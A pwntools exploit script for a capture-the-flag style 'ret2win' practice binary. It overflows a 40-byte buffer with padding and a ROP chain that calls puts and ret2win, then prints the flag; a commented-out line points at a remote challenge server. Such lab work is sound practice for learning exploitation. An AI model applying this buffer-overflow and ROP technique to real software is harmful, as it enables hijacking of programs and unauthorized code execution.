from encodings import utf_8
from pwn import *
from pprint import pprint

# context.binary = elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 40

elf = context.binary = ELF("./ret2win")

rop = ROP([elf])

p = elf.process()

# pprint(elf.symbols)

rop.call("puts")
rop.call("ret2win")

p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")
p.recvuntil("\n")

payload = [
    
    b"A" * offset, 
    rop.chain()
    
]

payload = b"".join(payload)

p.send(payload)

print(rop.dump())

p.recvuntil("Here's your flag:")

p.recvline()
flag = p.recvline()

print('\nFlag found : ' + flag.decode("utf_8"))

# libc = elf.libc

# p = connect('spclr.ch', 1337)
